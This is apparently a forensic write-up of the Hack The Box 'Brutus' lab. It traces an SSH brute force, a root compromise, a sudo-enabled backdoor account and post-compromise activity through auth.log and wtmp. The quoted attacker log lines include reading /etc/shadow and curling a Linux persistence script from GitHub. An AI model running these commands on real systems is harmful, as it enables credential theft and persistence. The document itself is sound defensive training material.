HTB Sherlock: Brutus

A detailed investigation of Unix auth.log and wtmp artifacts to reconstruct SSH brute-force activity, root compromise, manual terminal login, privileged persistence account creation and post-compromise command evidence.

Challenge
Brutus
Platform
Hack The Box
Type
Sherlock
Difficulty
Very Easy
Artifacts
auth.log, wtmp, utmp.py
Focus
SSH brute force, Linux sessions, persistence
Investigation Goal Identify the brute-force source IP, confirm the compromised account, determine when the attacker established an interactive session, track the persistence mechanism and extract the final sudo command.

Scenario Overview

The scenario describes a Confluence server that was attacked through SSH. The interesting part of this lab is that the investigation does not stop at failed password attempts. The same auth.log artifact also exposes account creation, group changes and sudo command execution. The wtmp artifact is then used to confirm the real login session time.

My main hypothesis was: if the brute-force succeeded, the attacker IP should appear in both failed SSH events and successful SSH authentication events. After that, the attacker's post-compromise activity should appear in session, account-management and sudo logs.

Artifacts and First Look

After extracting the challenge archive, the directory contained three important files: auth.log, utmp.py and wtmp. I first inspected auth.log manually because Linux auth logs are not CSV files. The field positions can shift depending on whether a log line contains invalid user, a PAM message, a sudo command or an SSH event.

The beginning of the log showed many CRON/PAM session entries for the confluence user. Since the scenario focuses on SSH brute force, I treated those early CRON entries as background noise and pivoted into sshd, Failed password and Accepted password events.

Methodology

I used a simple investigation workflow:

  1. Inspect the raw log format before extracting fields.
  2. Find successful SSH logins using grep "Accepted".
  3. Find failed password attempts and separate valid users from invalid user attempts.
  4. Correlate failed attempts with successful logins by source IP and timestamp.
  5. Use wtmp to confirm the terminal session time.
  6. Search for the suspicious user to identify persistence.
  7. Search sudo logs for post-compromise command execution.

Successful SSH Logins

The first useful pivot was filtering accepted SSH logins. The output showed two source IPs, but 65.2.161.68 stood out because it logged in as root multiple times and later as cyberjunkie.

$ cat auth.log | grep "Accepted" Mar 6 06:19:54 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2 Mar 6 06:31:40 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2 Mar 6 06:32:44 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2 Mar 6 06:37:34 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2

At this point, I did not immediately conclude that 65.2.161.68 was the attacker. I still needed failed-login evidence. However, seeing the same IP authenticate as root and then a non-standard user strongly suggested a compromise and persistence flow.

Brute-force Evidence

Next, I searched for failed password events. The raw failed output contained both valid local users and invalid user attempts. That is useful because it shows username guessing, but for the task I wanted to focus on valid accounts that were actually present on the system.

After removing invalid user entries, the remaining failed password events targeted only backup and root. This was important because root was later successfully authenticated from the same source IP.

$ grep -i "failed password" auth.log | grep -v invalid | cut -d ' ' -f 10 | sort | uniq -c | sort -nr 9 backup 6 root

The sequence around 06:31 tells the story clearly: failed attempts against root happened around the same minute as an accepted root login from 65.2.161.68. This supports the conclusion that the brute-force attack was successful and compromised the root account.

Source IP Enrichment

I also enriched the source IP with ipinfo.io. The IP resolved to AWS infrastructure in the ap-south-1 region. This does not prove the attacker's physical location; it only indicates that the source system was an AWS EC2 host, which is common for disposable attack infrastructure.

Analyst note: I would report this as “source IP hosted on AWS EC2” rather than “attacker is from India,” because cloud region geolocation is not the same as operator attribution.

Confirming the Manual Session with wtmp

The task asks for the time when the attacker logged in manually and established a terminal session. That timestamp is different from the SSH authentication timestamp. For this, I parsed the binary wtmp file using utmpdump.

The key wtmp record shows root on pts/1 from 65.2.161.68 at 2024-03-06 06:32:45. A later DEAD_PROCESS record shows that the session ended at 06:37:24. Only seconds later, cyberjunkie logged in from the same IP, which strongly supports the persistence-account theory.

Persistence Through a New Local Account

I searched for cyberjunkie across auth.log to understand whether it was an existing account or created during the incident. The logs showed the full account creation sequence: group creation, user creation, password change and sudo group membership.

This is a classic local-account persistence technique. The attacker used the compromised root account to create cyberjunkie, assign it a password, give it /bin/bash as a shell, add it to sudo, and then log in through SSH. The MITRE ATT&CK mapping is T1136.001 - Create Account: Local Account.

Sudo Command Evidence

The root session and the new backdoor account were not the end of the story. Sudo logs showed that cyberjunkie executed privileged commands from /home/cyberjunkie on pts/1.

Mar 6 06:37:57 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow Mar 6 06:39:38 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

The full command required by the task is:

/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

Lessons Learned

This lab is very useful for SOC fundamentals because it shows that auth.log can reveal much more than failed SSH logins. In one artifact, we can see brute-force behavior, successful authentication, PAM sessions, account creation, group membership changes and sudo command execution. wtmp then gives a separate source of truth for real interactive login sessions.

Final Conclusion The attacker brute-forced SSH from 65.2.161.68, compromised root, established a manual session at 2024-03-06 06:32:45, created a privileged local account named cyberjunkie for persistence, and used that account to execute privileged commands.
